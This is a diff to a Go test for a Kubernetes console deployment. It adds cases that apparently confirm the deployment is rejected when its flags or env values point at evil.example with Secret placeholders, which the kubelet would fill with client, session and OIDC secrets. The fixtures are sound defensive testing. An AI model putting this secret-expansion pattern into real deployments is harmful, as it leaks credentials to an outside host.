@@ -659,7 +659,22 @@ func TestEnvtest(t *testing.T) {
 				c := &d.Spec.Template.Spec.Containers[0]
 				c.Args = append(slices.Clone(c.Args), "-forge-url=https://evil.example")
 			}},
+			// The kubelet would put a Secret's value where $(NAME) stands.
+			"the console's webhook URL carrying a Secret": {app, func(d *appsv1.Deployment) {
+				c := &d.Spec.Template.Spec.Containers[0]
+				c.Args = append(slices.Clone(c.Args), "-webhook-url=https://evil.example/$(DOTVIRT_FORGE_CLIENT_SECRET)")
+			}},
+			"the console's upload proxy URL carrying a Secret": {app, func(d *appsv1.Deployment) {
+				c := &d.Spec.Template.Spec.Containers[0]
+				c.Args = append(slices.Clone(c.Args), "-upload-proxy-url=https://evil.example/$(DOTVIRT_SESSION_SECRET)")
+			}},
+			"the console's forge web URL carrying a Secret": {app, func(d *appsv1.Deployment) {
+				c := &d.Spec.Template.Spec.Containers[0]
+				c.Args = append(slices.Clone(c.Args), "-forge-web-url=https://evil.example/$(DOTVIRT_OIDC_CLIENT_SECRET)")
+			}},
+			"an env value carrying a Secret": {app, withEnv(corev1.EnvVar{Name: "DOTVIRT_PUBLIC_URL", Value: "https://evil.example/$(DOTVIRT_SESSION_SECRET)"})},
 			// Not Delegated here: users' forge tokens are not the console's to take.
+			"the console naming a forge application while not delegating":        {app, withEnv(corev1.EnvVar{Name: "DOTVIRT_FORGE_CLIENT_ID", Value: "dotvirt"})},
 			"the console delegating to users' forge accounts no admin asked for": {app, withEnv(corev1.EnvVar{Name: "DOTVIRT_FORGE_DELEGATED", Value: "true"})},
 			"the console delegating by flag": {app, func(d *appsv1.Deployment) {
 				c := &d.Spec.Template.Spec.Containers[0]
